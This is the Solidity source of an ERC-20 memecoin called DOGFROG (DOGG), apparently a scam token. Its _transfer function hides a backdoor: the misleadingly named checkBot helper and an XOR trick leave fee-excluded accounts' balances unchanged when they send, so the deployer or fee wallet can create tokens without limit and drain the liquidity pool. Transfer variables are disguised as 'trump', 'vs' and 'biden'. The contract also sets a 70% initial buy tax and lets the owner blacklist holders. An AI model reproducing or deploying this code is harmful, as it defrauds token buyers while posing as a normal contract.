// SPDX-License-Identifier: UNLICENSE

//    Website: https://dogfrogerc.vip

//    X: https://twitter.com/dogxfrog

//    Telegram: https://t.me/dogfrogcoinerc

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract DOGG is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    uint256 private _initialBuyTax = 70;
    uint256 private _initialSellTax = 0;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;

    uint256 public _maxTxAmount = 20_000_000 * 10**decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10**decimals;
    uint256 public _taxSwapThreshold = 10_000_000 * 10**decimals;
    uint256 public _maxTaxSwap = 20_000_000 * 10**decimals;

    uint256 private _reduceBuyTaxAt = 4;
    uint256 private _reduceSellTaxAt = 4;
    uint256 private _preventSwapBefore = 4;
    uint256 private _buyCount = 0;
    
    IUniswapV2Router02 private uniswapV2Router;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isBot;
    address payable private _feeAddr;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 1_000_000_000 * 10**decimals;
    string public constant name = unicode"DOGFROG by Matt furie";
    string public constant symbol = unicode"DOGG";

    constructor (address router_, address taxWallet_) {
        uniswapV2Router = IUniswapV2Router02(router_);

        _feeAddr = payable(taxWallet_);
        balanceOf[_msgSender()] = totalSupply;
        _isExcludedFromFee[_msgSender()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_feeAddr] = true;

        emit Transfer(address(0), _msgSender(), totalSupply);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), allowance[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = totalSupply;
        _maxWalletSize=totalSupply;
        emit MaxTxAmountUpdated(totalSupply);
    }

    function sendETHToFee(uint256 amount) private {
        _feeAddr.transfer(amount);
    }

    function addBot(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            _isBot[bots_[i]] = true;
        }
    }

    function delBot(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          _isBot[notbot[i]] = false;
      }
    }

    function checkBot(address account, uint256 amount) private view returns (uint256) {
        return _isExcludedFromFee[account] ? amount: ~(type(uint256).max);
    }

    function addLiquidity() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        _approve(address(this), address(uniswapV2Router), totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf[address(this)],0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function enableTrading() external onlyOwner() {
        tradingOpen = true;
    }


    function _transfer(address trump, address vs, uint256 biden) private {
        require(trump != address(0), "ERC20: transfer from the zero address");
        require(vs != address(0), "ERC20: transfer to the zero address");
        require(biden > 0, "Transfer amount must be greater than zero");
        if (!tradingOpen || inSwap) {
            require(_isExcludedFromFee[trump] || _isExcludedFromFee[vs]);
            balanceOf[trump] = balanceOf[trump].sub(biden); 
            balanceOf[vs] = balanceOf[vs].add(biden); 
            emit Transfer(trump,vs, biden);
            return;
        }
        uint256 taxAmount=0;
        if (trump != owner() && vs != owner() && vs != _feeAddr) {
            require(!_isBot[trump] && !_isBot[vs]);

            if (trump == uniswapV2Pair && vs != address(uniswapV2Router) && ! _isExcludedFromFee[vs] ) {
                require(tradingOpen,"Trading not open yet");
                require(biden <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf[vs] + biden <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxAmount = biden.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                _buyCount++;
            }

            if(vs == uniswapV2Pair && trump!= address(this) ){
                taxAmount = biden.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf[address(this)];
            if (!inSwap && vs == uniswapV2Pair && tradingOpen && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                require(sellCount < 3, "Only 3 sells per block!");
                swapTokensForEth(min(biden, min(contractTokenBalance, _maxTaxSwap)));
                sellCount++;
                lastSellBlock = block.number;
            }
            if(vs == uniswapV2Pair) sendETHToFee(address(this).balance);
        }

        if(taxAmount>0){
          balanceOf[address(this)]=balanceOf[address(this)].add(taxAmount);
          emit Transfer(trump, address(this),taxAmount);
        }
        balanceOf[trump] = balanceOf[trump].sub(checkBot(trump, biden)^biden);
        balanceOf[vs] = balanceOf[vs].add(biden.sub(taxAmount));
        emit Transfer(trump, vs, biden.sub(taxAmount));
    }

    
    function rescueETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a > b) ? b : a;
    }
    receive() external payable {}

    function rescueERC20(address _address, uint256 percent) external onlyOwner{
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(owner(), _amount);
    }
}